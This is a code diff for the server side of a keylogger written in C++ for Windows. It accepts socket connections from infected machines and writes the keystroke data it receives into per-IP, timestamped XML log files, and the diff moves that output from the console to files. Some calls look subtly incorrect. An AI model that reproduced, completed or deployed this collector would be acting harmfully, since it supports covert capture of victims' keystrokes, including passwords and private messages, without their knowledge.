@@ -52,7 +52,6 @@ void Listener()
         SOCKET *acceptedTarget = new SOCKET;
         *acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
         SOCKETLIST *link = new SOCKETLIST;
-        GetSystemTime(&timestamp);
         if(*acceptedTarget==INVALID_SOCKET)
         {
             fprintf(stderr ,"\n\t\t[*] error connecting");
@@ -64,11 +63,23 @@ void Listener()
             u_long mode =1;
             ioctlsocket(*acceptedTarget,FIONBIO,&mode);
 
-            link->target = acceptedTarget;
             link->name = (char*)malloc(0xf0);
-            sprintf(link->name,"%d_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
-            timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
+            link->target = acceptedTarget;
+            /*
+                if a file from the same ip is created at the same time then the naming convention
+                may fail. try again for a new time_stamp.
+            */
+            do
+            {
+                GetSystemTime(&timestamp);
+                sprintf(link->name,"%d_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
+                    timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
 
+                link->FileDescriptor = CreateFileA(link->name,(GENERIC_READ|GENERIC_WRITE),
+                                               FILE_SHARE_READ,NULL,CREATE_ALWAYS,
+                                               FILE_ATTRIBUTE_NORMAL,NULL);
+            }while(link->FileDescriptor == INVALID_HANDLE_VALUE);
+            SetFilePointer(link->FileDescriptor,0x00,NULL,FILE_BEGIN);
             mu.lock();
             /*
                 establish a self referential linked list,
@@ -112,7 +123,11 @@ void Handler()
                 while(recv(*(link->target),buffer,0x1001,0) !=  SOCKET_ERROR )
                 {
                         *(buffer+0x1000)=0x00;
-                       printf("%s",buffer);
+                        WriteFile(link->FileDescriptor,buffer,strlen(buffer),NULL,NULL);
+                        WriteFile(link->FileDescriptor,"\n</KeyLoggerMetaData>\n",
+                                  strlen("\n</KeyLoggerMetaData>\n"),NULL,NULL);
+                        SetFilePointer(link->FileDescriptor,((-1)*strlen("\n</KeyLoggerMetaData>\n")),NULL,FILE_CURRENT);
+   
                 }
                 if (WSAGetLastError() == WSAEWOULDBLOCK)
                 {
@@ -122,7 +137,6 @@ void Handler()
                 }
                 else
                 {
-                    printf("\n</KeyLoggerMetaData>\n");
                     SOCKETLIST temp = *(link->nextTarget);
                    if( link->target == temp.target)
                     {
